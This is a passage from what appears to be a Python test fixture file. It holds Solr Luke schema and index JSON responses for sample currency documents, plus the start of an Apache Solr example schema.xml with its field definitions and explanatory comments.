}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ro.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Romanian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_ru\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ru.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Russian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ru.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Russian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_sv\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_sv.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Swedish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_sv.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Swedish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_th\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"ThaiWordFilterFactory\":{\"args\":{\"class\":\"solr.ThaiWordFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.th.ThaiWordFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_th.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"ThaiWordFilterFactory\":{\"args\":{\"class\":\"solr.ThaiWordFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.th.ThaiWordFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_th.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"}}},\"similarity\":{}},\"text_tr\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"TurkishLowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.TurkishLowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.tr.TurkishLowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_tr.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"false\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Turkish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"TurkishLowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.TurkishLowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.tr.TurkishLowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_tr.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"false\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Turkish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_ws\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.WhitespaceTokenizerFactory\",\"args\":{\"class\":\"solr.WhitespaceTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.WhitespaceTokenizerFactory\",\"args\":{\"class\":\"solr.WhitespaceTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}}},\"similarity\":{}},\"tfloat\":{\"fields\":[\"*_tf\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieFloatField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"tint\":{\"fields\":[\"*_ti\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieIntField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"tlong\":{\"fields\":[\"*_tl\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieLongField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}}}},\"info\":{\"key\":{\"I\":\"Indexed\",\"T\":\"Tokenized\",\"S\":\"Stored\",\"D\":\"DocValues\",\"M\":\"Multivalued\",\"V\":\"TermVector Stored\",\"o\":\"Store Offset With TermVector\",\"p\":\"Store Position With TermVector\",\"O\":\"Omit Norms\",\"F\":\"Omit Term Frequencies & Positions\",\"P\":\"Omit Positions\",\"H\":\"Store Offsets with Positions\",\"L\":\"Lazy\",\"B\":\"Binary\",\"f\":\"Sort Missing First\",\"l\":\"Sort Missing Last\"},\"NOTE\":\"Document Frequency (df) is not updated when a document is marked for deletion.  df values include deleted documents.\"}}\"\"\"\n\nSOLR_LUKE_ = \"\"\"{\"responseHeader\":{\"status\":0,\"QTime\":5},\"index\":{\"numDocs\":8,\"maxDoc\":8,\"deletedDocs\":0,\"version\":15,\"segmentCount\":5,\"current\":true,\"hasDeletions\":false,\"directory\":\"org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(org.apache.solr.store.hdfs.HdfsDirectory@5efe087b lockFactory=org.apache.solr.store.hdfs.HdfsLockFactory@5106def2; maxCacheMB=192.0 maxMergeSizeMB=16.0)\",\"userData\":{\"commitTimeMSec\":\"1389233070579\"},\"lastModified\":\"2014-01-09T02:04:30.579Z\"},\"fields\":{\"_version_\":{\"type\":\"long\",\"schema\":\"ITS-----OF------\",\"index\":\"-TS-------------\",\"docs\":8,\"distinct\":8,\"topTerms\":[\"1456716393276768256\",1,\"1456716398067712000\",1,\"1456716401465098240\",1,\"1460689159964327936\",1,\"1460689159981105152\",1,\"1460689159988445184\",1,\"1460689159993688064\",1,\"1456716273606983680\",1],\"histogram\":[\"1\",8]},\"cat\":{\"type\":\"string\",\"schema\":\"I-S-M---OF-----l\",\"index\":\"ITS-----OF------\",\"docs\":4,\"distinct\":1,\"topTerms\":[\"currency\",4],\"histogram\":[\"1\",0,\"2\",0,\"4\",1]},\"features\":{\"type\":\"text_general\",\"schema\":\"ITS-M-----------\",\"index\":\"ITS-------------\",\"docs\":4,\"distinct\":3,\"topTerms\":[\"coins\",4,\"notes\",4,\"and\",4],\"histogram\":[\"1\",0,\"2\",0,\"4\",3]},\"id\":{\"type\":\"string\",\"schema\":\"I-S-----OF-----l\",\"index\":\"ITS-----OF------\",\"docs\":8,\"distinct\":8,\"topTerms\":[\"GBP\",1,\"NOK\",1,\"USD\",1,\"change.me\",1,\"change.me1\",1,\"change.me112\",1,\"change.me12\",1,\"EUR\",1],\"histogram\":[\"1\",8]},\"inStock\":{\"type\":\"boolean\",\"schema\":\"I-S-----OF-----l\",\"index\":\"ITS-----OF------\",\"docs\":4,\"distinct\":1,\"topTerms\":[\"true\",4],\"histogram\":[\"1\",0,\"2\",0,\"4\",1]},\"manu\":{\"type\":\"text_general\",\"schema\":\"ITS-----O-------\",\"index\":\"ITS-----O-------\",\"docs\":4,\"distinct\":7,\"topTerms\":[\"of\",2,\"bank\",2,\"european\",1,\"norway\",1,\"u.k\",1,\"union\",1,\"america\",1],\"histogram\":[\"1\",5,\"2\",2]},\"manu_exact\":{\"type\":\"string\",\"schema\":\"I-------OF-----l\",\"index\":\"(unstored field)\",\"docs\":4,\"distinct\":4,\"topTerms\":[\"Bank of Norway\",1,\"European Union\",1,\"U.K.\",1,\"Bank of America\",1],\"histogram\":[\"1\",4]},\"manu_id_s\":{\"type\":\"string\",\"schema\":\"I-S-----OF-----l\",\"dynamicBase\":\"*_s\",\"index\":\"ITS-----OF------\",\"docs\":4,\"distinct\":4,\"topTerms\":[\"eu\",1,\"nor\",1,\"uk\",1,\"boa\",1],\"histogram\":[\"1\",4]},\"name\":{\"type\":\"text_general\",\"schema\":\"ITS-------------\",\"index\":\"ITS-------------\",\"docs\":4,\"distinct\":6,\"topTerms\":[\"one\",4,\"euro\",1,\"krone\",1,\"dollar\",1,\"pound\",1,\"british\",1],\"histogram\":[\"1\",5,\"2\",0,\"4\",1]},\"price_c\":{\"type\":\"currency\",\"schema\":\"I-S------F------\",\"dynamicBase\":\"*_c\"},\"price_c____amount_raw\":{\"type\":\"amount_raw_type_tlong\",\"schema\":\"IT------O-------\",\"dynamicBase\":\"*____amount_raw\",\"index\":\"(unstored field)\",\"docs\":4,\"distinct\":8,\"topTerms\":[\"0\",4,\"0\",4,\"0\",4,\"0\",4,\"0\",4,\"0\",4,\"0\",4,\"100\",4],\"histogram\":[\"1\",0,\"2\",0,\"4\",8]},\"price_c____currency\":{\"type\":\"currency_type_string\",\"schema\":\"I-------O-------\",\"dynamicBase\":\"*____currency\",\"index\":\"(unstored field)\",\"docs\":4,\"distinct\":4,\"topTerms\":[\"GBP\",1,\"NOK\",1,\"USD\",1,\"EUR\",1],\"histogram\":[\"1\",4]},\"romain_t\":{\"type\":\"text_general\",\"schema\":\"ITS-------------\",\"dynamicBase\":\"*_t\",\"index\":\"ITS-------------\",\"docs\":1,\"distinct\":1,\"topTerms\":[\"true\",1],\"histogram\":[\"1\",1]},\"text\":{\"type\":\"text_general\",\"schema\":\"IT--M-----------\",\"index\":\"(unstored field)\",\"docs\":8,\"distinct\":21,\"topTerms\":[\"and\",4,\"currency\",4,\"notes\",4,\"one\",4,\"coins\",4,\"bank\",2,\"of\",2,\"change.me112\",1,\"change.me1\",1,\"change.me\",1],\"histogram\":[\"1\",14,\"2\",2,\"4\",5]},\"title\":{\"type\":\"text_general\",\"schema\":\"ITS-M-----------\",\"index\":\"ITS-------------\",\"docs\":4,\"distinct\":4,\"topTerms\":[\"change.me1\",1,\"change.me112\",1,\"change.me12\",1,\"change.me\",1],\"histogram\":[\"1\",4]}},\"info\":{\"key\":{\"I\":\"Indexed\",\"T\":\"Tokenized\",\"S\":\"Stored\",\"D\":\"DocValues\",\"M\":\"Multivalued\",\"V\":\"TermVector Stored\",\"o\":\"Store Offset With TermVector\",\"p\":\"Store Position With TermVector\",\"O\":\"Omit Norms\",\"F\":\"Omit Term Frequencies & Positions\",\"P\":\"Omit Positions\",\"H\":\"Store Offsets with Positions\",\"L\":\"Lazy\",\"B\":\"Binary\",\"f\":\"Sort Missing First\",\"l\":\"Sort Missing Last\"},\"NOTE\":\"Document Frequency (df) is not updated when a document is marked for deletion.  df values include deleted documents.\"}}\"\"\"\n\nSOLR_SCHEMA = \"\"\"\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!--\n Licensed to the Apache Software Foundation (ASF) under one or more\n contributor license agreements.  See the NOTICE file distributed with\n this work for additional information regarding copyright ownership.\n The ASF licenses this file to You under the Apache License, Version 2.0\n (the \"License\"); you may not use this file except in compliance with\n the License.  You may obtain a copy of the License at\n\n     http://www.apache.org/licenses/LICENSE-2.0\n\n Unless required by applicable law or agreed to in writing, software\n distributed under the License is distributed on an \"AS IS\" BASIS,\n WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n See the License for the specific language governing permissions and\n limitations under the License.\n-->\n\n<!--\n This is the Solr schema file. This file should be named \"schema.xml\" and\n should be in the conf directory under the solr home\n (i.e. ./solr/conf/schema.xml by default)\n or located where the classloader for the Solr webapp can find it.\n\n This example schema is the recommended starting point for users.\n It should be kept correct and concise, usable out-of-the-box.\n\n For more information, on how to customize this file, please see\n http://wiki.apache.org/solr/SchemaXml\n\n PERFORMANCE NOTE: this schema includes many optional features and should not\n be used for benchmarking.  To improve performance one could\n  - set stored=\"false\" for all fields possible (esp large fields) when you\n    only need to search on the field but don't need to return the original\n    value.\n  - set indexed=\"false\" if you don't need to search on the field, but only\n    return the field as a result of searching on other indexed fields.\n  - remove all unneeded copyField statements\n  - for best index size and searching performance, set \"index\" to false\n    for all general text fields, use copyField to copy them to the\n    catchall \"text\" field, and use that for searching.\n  - For maximum indexing performance, use the StreamingUpdateSolrServer\n    java client.\n  - Remember to run the JVM in server mode, and use a higher logging level\n    that avoids logging every request\n-->\n\n<schema name=\"example\" version=\"1.5\">\n  <!-- attribute \"name\" is the name of this schema and is only used for display purposes.\n       version=\"x.y\" is Solr's version number for the schema syntax and\n       semantics.  It should not normally be changed by applications.\n\n       1.0: multiValued attribute did not exist, all fields are multiValued\n            by nature\n       1.1: multiValued attribute introduced, false by default\n       1.2: omitTermFreqAndPositions attribute introduced, true by default\n            except for text fields.\n       1.3: removed optional field compress feature\n       1.4: autoGeneratePhraseQueries attribute introduced to drive QueryParser\n            behavior when a single string produces multiple tokens.  Defaults\n            to off for version >= 1.4\n       1.5: omitNorms defaults to true for primitive field types\n            (int, float, boolean, string...)\n     -->\n\n <fields>\n   <!-- Valid attributes for fields:\n     name: mandatory - the name for the field\n     type: mandatory - the name of a field type from the\n       <types> fieldType section\n     indexed: true if this field should be indexed (searchable or sortable)\n     stored: true if this field should be retrievable\n     docValues: true if this field should have doc values. Doc values are\n       useful for faceting, grouping, sorting and function queries. Although not\n       required, doc values will make the index faster to load, more\n       NRT-friendly and more memory-efficient. They however come with some\n       limitations: they are currently only supported by StrField, UUIDField\n       and all Trie*Fields, and depending on the field type, they might\n       require the field to be single-valued, be required or have a default\n       value (check the documentation of the field type you're interested in\n       for more information)\n     multiValued: true if this field may contain multiple values per document\n     omitNorms: (expert) set to true to omit the norms associated with\n       this field (this disables length normalization and index-time\n       boosting for the field, and saves some memory).  Only full-text\n       fields or fields that need an index-time boost need norms.\n       Norms are omitted for primitive (non-analyzed) types by default.\n     termVectors: [false] set to true to store the term vector for a\n       given field.\n       When using MoreLikeThis, fields used for similarity should be\n       stored for best performance.\n     termPositions: Store position information with the term vector.\n       This will increase storage costs.\n     termOffsets: Store offset information with the term vector. This\n       will increase storage costs.\n     required: The field is required.  It will throw an error if the\n       value does not exist\n     default: a value that should be used if no value is specified\n       when adding a document.\n   -->\n\n   <!-- field names should consist of alphanumeric or underscore characters only and\n      not start with a digit.  This is not currently strictly enforced,\n      but other field names will not have first class support from all components\n      and back compatibility is not guaranteed.  Names with both leading and\n      trailing underscores (e.g. _version_) are reserved.\n   -->\n\n   <field name=\"id\" type=\"string\" indexed=\"true\" stored=\"true\" required=\"true\" multiValued=\"false\" />\n   <field name=\"sku\" type=\"text_en_splitting_tight\" indexed=\"true\" stored=\"true\" omitNorms=\"true\"/>\n   <field name=\"name\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"manu\" type=\"text_general\" indexed=\"true\" stored=\"true\" omitNorms=\"true\"/>\n   <field name=\"cat\" type=\"string\" indexed=\"true\" stored=\"true\" multiValued=\"true\"/>\n   <field name=\"features\" type=\"text_general\" indexed=\"true\" stored=\"true\" multiValued=\"true\"/>\n   <field name=\"includes\" type=\"text_general\" indexed=\"true\" stored=\"true\" termVectors=\"true\" termPositions=\"true\" termOffsets=\"true\" />\n\n   <field name=\"weight\" type=\"float\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"price\"  type=\"float\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"popularity\" type=\"int\" indexed=\"true\" stored=\"true\" />\n   <field name=\"inStock\" type=\"boolean\" indexed=\"true\" stored=\"true\" />\n\n   <field name=\"store\" type=\"location\" indexed=\"true\" stored=\"true\"/>\n\n   <!-- Common metadata fields, named specifically to match up with\n     SolrCell metadata when parsing rich documents such as Word, PDF.\n     Some fields are multiValued only because Tika currently may return\n     multiple values for them. Some metadata is parsed from the documents,\n     but there are some which come from the client context:\n       \"content_type\": From the HTTP headers of incoming stream\n       \"resourcename\": From SolrCell request param resource.name\n   -->\n   <field name=\"title\" type=\"text_general\" indexed=\"true\" stored=\"true\" multiValued=\"true\"/>\n   <field name=\"subject\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"description\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"comments\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"author\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"keywords\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"category\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"resourcename\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"url\" type=\"text_general\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"content_type\" type=\"string\" indexed=\"true\" stored=\"true\" multiValued=\"true\"/>\n   <field name=\"last_modified\" type=\"date\" indexed=\"true\" stored=\"true\"/>\n   <field name=\"links\" type=\"string\" indexed=\"true\" stored=\"true\" multiValued=\"true\"/>\n\n   <!-- Main body of document extracted by SolrCell.\n        NOTE: This field is not indexed by default, since it is also copied to \"text\"\n        using copyField below. This is to save space. Use this field for returning and\n        highlighting document content. Use the \"text\" field to search the content. -->\n   <field name=\"content\" type=\"text_general\" indexed=\"false\" stored=\"true\" multiValued=\"true\"/>\n\n\n   <!-- catchall field, containing all other searchable text fields (implemented\n        via copyField further on in this schema  -->\n   <field name=\"text\" type=\"text_general\" indexed=\"true\" stored=\"false\" multiValued=\"true\"/>\n\n   <!-- catchall text field that indexes tokens both normally and in reverse for efficient\n        leading wildcard queries. -->\n   <field name=\"text_rev\" type=\"text_general_rev\" indexed=\"true\" stored=\"false\" multiValued=\"true\"/>\n\n   <!-- non-tokenized version of manufacturer to make it easier to sort or group\n        results by manufacturer.  copied from \"manu\" via copyField -->\n   <field name=\"manu_exact\" type=\"string\" indexed=\"true\" stored=\"false\"/>\n\n   <field name=\"payloads\" type=\"payloads\" indexed=\"true\" stored=\"true\"/>\n\n   <field name=\"_version_\" type=\"long\" indexed=\"true\" stored=\"true\"/>\n\n   <!--\n     Some fields such as popularity and manu_exact could be modified to\n     leverage doc values:\n     <field name=\"popularity\" type=\"int\" indexed=\"true\" stored=\"true\" docValues=\"true\" default=\"0\" />\n     <field name=\"manu_exact\" type=\"string\" indexed=\"false\" stored=\"false\" docValues=\"true\" default=\"\" />\n\n     Although it would make indexing slightly slower and the index bigger, it\n     would also make the index faster to load, more memory-efficient and more\n     NRT-friendly.\n     -->\n\n   <!-- Dynamic field definitions allow using convention over configuration\n       for fields via the specification of patterns to match field names.\n       EXAMPLE:  name=\"*_i\" will match any field ending in _i (like myid_i, z_i)\n       RESTRICTION: the glob-like pattern in the name attribute must have\n       a \"*\" only at the start or the end.  -->\n\n   <dynamicField name=\"*_i\"  type=\"int\"    indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_is\" type=\"int\"    indexed=\"true\"  stored=\"true\"  multiValued=\"true\"/>\n   <dynamicField name=\"*_s\"  type=\"string\"  indexed=\"true\"  stored=\"true\" />\n   <dynamicField name=\"*_ss\" type=\"string\"  indexed=\"true\"  stored=\"true\" multiValued=\"true\"/>\n   <dynamicField name=\"*_l\"  type=\"long\"   indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_ls\" type=\"long\"   indexed=\"true\"  stored=\"true\"  multiValued=\"true\"/>\n   <dynamicField name=\"*_t\"  type=\"text_general\"    indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_txt\" type=\"text_general\"   indexed=\"true\"  stored=\"true\" multiValued=\"true\"/>\n   <dynamicField name=\"*_en\"  type=\"text_en\"    indexed=\"true\"  stored=\"true\" multiValued=\"true\"/>\n   <dynamicField name=\"*_b\"  type=\"boolean\" indexed=\"true\" stored=\"true\"/>\n   <dynamicField name=\"*_bs\" type=\"boolean\" indexed=\"true\" stored=\"true\"  multiValued=\"true\"/>\n   <dynamicField name=\"*_f\"  type=\"float\"  indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_fs\" type=\"float\"  indexed=\"true\"  stored=\"true\"  multiValued=\"true\"/>\n   <dynamicField name=\"*_d\"  type=\"double\" indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_ds\" type=\"double\" indexed=\"true\"  stored=\"true\"  multiValued=\"true\"/>\n\n   <!-- Type used to index the lat and lon components for the \"location\" FieldType -->\n   <dynamicField name=\"*_coordinate\"  type=\"tdouble\" indexed=\"true\"  stored=\"false\" />\n\n   <dynamicField name=\"*_dt\"  type=\"date\"    indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_dts\" type=\"date\"    indexed=\"true\"  stored=\"true\" multiValued=\"true\"/>\n   <dynamicField name=\"*_p\"  type=\"location\" indexed=\"true\" stored=\"true\"/>\n\n   <!-- some trie-coded dynamic fields for faster range queries -->\n   <dynamicField name=\"*_ti\" type=\"tint\"    indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_tl\" type=\"tlong\"   indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_tf\" type=\"tfloat\"  indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_td\" type=\"tdouble\" indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_tdt\" type=\"tdate\"  indexed=\"true\"  stored=\"true\"/>\n\n   <dynamicField name=\"*_pi\"  type=\"pint\"    indexed=\"true\"  stored=\"true\"/>\n   <dynamicField name=\"*_c\"   type=\"currency\" indexed=\"true\"  stored=\"true\"/>\n\n   <dynamicField name=\"ignored_*\" type=\"ignored\" multiValued=\"true\"/>\n   <dynamicField name=\"attr_*\" type=\"text_general\" indexed=\"true\" stored=\"true\" multiValued=\"true\"/>\n\n   <dynamicField name=\"random_*\" type=\"random\" />\n\n   <!-- uncomment the following to ignore any fields that don't already match an existing\n        field name or dynamic field, rather than reporting them as an error.\n        alternately, change the type=\"ignored\" to some other type e.g. \"text\" if you want\n        unknown fields indexed and/or stored by default -->\n   <!--dynamicField name=\"*\" type=\"ignored\" multiValued=\"true\" /-->\n\n </fields>\n\n\n <!-- Field to use to determine and enforce document uniqueness.\n      Unless this field is marked with required=\"false\", it will be a required field\n   -->\n 